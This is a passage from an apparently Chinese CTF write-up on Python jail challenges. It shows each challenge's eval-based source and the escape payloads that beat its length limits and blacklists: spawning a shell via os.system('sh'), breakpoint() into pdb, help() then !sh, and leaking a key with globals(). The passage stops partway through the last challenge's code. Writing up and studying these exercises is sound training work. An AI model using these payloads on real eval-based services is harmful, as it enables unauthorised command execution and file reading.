<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#the length is be limited less than 13</span>
</span></span><span class="line"><span class="cl"><span class="c1">#it seems banned some payload </span>
</span></span><span class="line"><span class="cl"><span class="c1">#Can u escape it?Good luck!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">WELCOME</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">  _                _                           _       _ _   _                _ ___  
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |              (_)                         (_)     (_) | | |              | |__ \ 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |
</span></span></span><span class="line"><span class="cl"><span class="s1"> | &#39;_ \ / _ \/ _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / / 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_ 
</span></span></span><span class="line"><span class="cl"><span class="s1"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|
</span></span></span><span class="line"><span class="cl"><span class="s1">              __/ |                          _/ |                                    
</span></span></span><span class="line"><span class="cl"><span class="s1">             |___/                          |__/                                                                            
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">WELCOME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Welcome to the python jail&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Let&#39;s have an beginner jail of calc&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Enter your expression and I will evaluate it for you.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">input_data</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">len</span><span class="p">(</span><span class="n">input_data</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">13</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Oh hacker!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Answer: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">eval</span><span class="p">(</span><span class="n">input_data</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>限制传入字符不大于13</p>
<p>参数逃逸</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">exec(input())
</span></span><span class="line"><span class="cl">__import__(&#39;os&#39;).system(&#39;sh&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="calc_jail_beginner_level25" class="headerLink">
    <a href="#calc_jail_beginner_level25" class="header-mark"></a>calc_jail_beginner_level2.5</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#the length is be limited less than 13</span>
</span></span><span class="line"><span class="cl"><span class="c1">#it seems banned some payload </span>
</span></span><span class="line"><span class="cl"><span class="c1">#banned some unintend sol</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Can u escape it?Good luck!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filter</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">BLACKLIST</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;exec&#34;</span><span class="p">,</span><span class="s2">&#34;input&#34;</span><span class="p">,</span><span class="s2">&#34;eval&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">BLACKLIST</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;{i!r} has been banned for security reasons&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">WELCOME</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">  _                _                           _       _ _ _                _ ___    _____ 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |              (_)                         (_)     (_) | |              | |__ \  | ____|
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  
</span></span></span><span class="line"><span class="cl"><span class="s1"> | &#39;_ \ / _ \/ _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |
</span></span></span><span class="line"><span class="cl"><span class="s1"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ 
</span></span></span><span class="line"><span class="cl"><span class="s1">              __/ |                          _/ |                                          
</span></span></span><span class="line"><span class="cl"><span class="s1">             |___/                          |__/                                                                                                            
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">WELCOME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Welcome to the python jail&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Let&#39;s have an beginner jail of calc&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Enter your expression and I will evaluate it for you.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">input_data</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">filter</span><span class="p">(</span><span class="n">input_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">len</span><span class="p">(</span><span class="n">input_data</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">13</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Oh hacker!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Answer: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">eval</span><span class="p">(</span><span class="n">input_data</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">breakpoint</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>就会进到Pdb里面，随后pj直接一句话RCE</p>
<h3 id="calc_jail_beginner_level3" class="headerLink">
    <a href="#calc_jail_beginner_level3" class="header-mark"></a>calc_jail_beginner_level3</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="n">WELCOME</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">  _                _                           _       _ _   _                _ ____  
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |              (_)                         (_)     (_) | | |              | |___ \ 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |
</span></span></span><span class="line"><span class="cl"><span class="s1"> | &#39;_ \ / _ \/ _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ &lt; 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |
</span></span></span><span class="line"><span class="cl"><span class="s1"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/ 
</span></span></span><span class="line"><span class="cl"><span class="s1">              __/ |                          _/ |                                     
</span></span></span><span class="line"><span class="cl"><span class="s1">             |___/                          |__/                                                                                       
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">WELCOME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#the length is be limited less than 7</span>
</span></span><span class="line"><span class="cl"><span class="c1">#it seems banned some payload </span>
</span></span><span class="line"><span class="cl"><span class="c1">#Can u escape it?Good luck!</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Welcome to the python jail&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Let&#39;s have an beginner jail of calc&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Enter your expression and I will evaluate it for you.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">input_data</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">len</span><span class="p">(</span><span class="n">input_data</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">7</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Oh hacker!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">eval</span><span class="p">(</span><span class="n">input_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Answer: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>限制传入字符不大于7</p>
<p>可以通过<code>help</code>函数来进行RCE</p>
<p>开始输入<code>help()</code>，进入到help界面，然后随便找个模块，例如<code>os</code>输入，此时就会显示<code>os</code>模块的帮助页面，输入<code>!sh</code>就能进到shell里面去。</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">help()
</span></span><span class="line"><span class="cl">os
</span></span><span class="line"><span class="cl">!cat flag
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="python2-input" class="headerLink">
    <a href="#python2-input" class="header-mark"></a>python2 input</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># It&#39;s escape this repeat!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">WELCOME = &#39;&#39;&#39;
</span></span><span class="line"><span class="cl">              _   _      ___        ___    _____             _    _ _   
</span></span><span class="line"><span class="cl">             | | | |    / _ \      |__ \  |_   _|           | |  | | |  
</span></span><span class="line"><span class="cl">  _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_ 
</span></span><span class="line"><span class="cl"> | &#39;_ \| | | | __| &#39;_ \| | | | &#39;_ \  / /    | | | &#39;_ \| &#39;_ \| |  | | __|
</span></span><span class="line"><span class="cl"> | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_ 
</span></span><span class="line"><span class="cl"> | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|
</span></span><span class="line"><span class="cl"> | |     __/ |                                        | |               
</span></span><span class="line"><span class="cl"> |_|    |___/                                         |_|                               
</span></span><span class="line"><span class="cl">&#39;&#39;&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">print WELCOME
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">print &#34;Welcome to the python jail&#34;
</span></span><span class="line"><span class="cl">print &#34;But this program will repeat your messages&#34;
</span></span><span class="line"><span class="cl">input_data = input(&#34;&gt; &#34;)
</span></span><span class="line"><span class="cl">print input_data
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<ul>
<li>在python 2中，<code>input</code>函数从标准输入接收输入，并且自动<code>eval</code>求值，返回求出来的值；</li>
<li>在python 2中，<code>raw_input</code>函数从标准输入接收输入，返回输入字符串；</li>
<li>在python 3中，<code>input</code>函数从标准输入接收输入，返回输入字符串；</li>
<li>可以认为，python 2 <code>input()</code> = python 2 <code>eval(raw_input())</code> = python 3 <code>eval(input())</code></li>
</ul>
</blockquote>
<p>如果碰到python 2中间用了<code>input</code>函数，那么我们就可以直接一句话RCE：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="lake-lake-lake" class="headerLink">
    <a href="#lake-lake-lake" class="header-mark"></a>lake lake lake</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#it seems have a backdoor</span>
</span></span><span class="line"><span class="cl"><span class="c1">#can u find the key of it and use the backdoor</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fake_key_var_in_the_local_but_real_in_the_remote</span> <span class="o">=</span> <span class="s2">&#34;[DELETED]&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">func</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">9</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;you&#39;re hacker!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">eval</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">backdoor</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Please enter the admin key&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="n">fake_key_var_in_the_local_but_real_in_the_remote</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">eval</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Nooo!!!!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">WELCOME</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">  _       _          _       _          _       _        
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |     | |        | |     | |        | |     | |       
</span></span></span><span class="line"><span class="cl"><span class="s1"> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ </span><span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1"> | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/
</span></span></span><span class="line"><span class="cl"><span class="s1"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">WELCOME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Now the program has two functions&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;can you use dockerdoor&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;1.func&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;2.backdoor&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">input_data</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">input_data</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">func</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">elif</span><span class="p">(</span><span class="n">input_data</span> <span class="o">==</span> <span class="s2">&#34;2&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">backdoor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;not found the choice&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个key变量是全局变量，可以用<code>globals()</code>来泄露所有全局变量的值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">globals()
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010234418136.png?imageSlim" title="image-20241010234418136" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010234418136.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010234418136.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010234418136.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010234418136.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010234418136.png?imageSlim 2x"
            sizes="auto"
            alt="image-20241010234418136">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__import__(&#39;os&#39;).system(&#39;sh&#39;)
</span></span><span class="line"><span class="cl">cat flag
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="lke-lke-lke" class="headerLink">
    <a href="#lke-lke-lke" class="header-mark"></a>l@ke l@ke l@ke</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#it seems have a backdoor as `lake lake lake`</span>
</span></span><span class="line"><span class="cl"><span class="c1">#but it seems be limited!</span>
</span></span><span class="line"><span class="cl"><span class="c1">#can u find the key of it and use the backdoor</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fake_key_var_in_the_local_but_real_in_the_remote</span> <span class="o">=</span> <span class="s2">&#34;[DELETED]&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">func</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">6</span><span class="p">):</span>
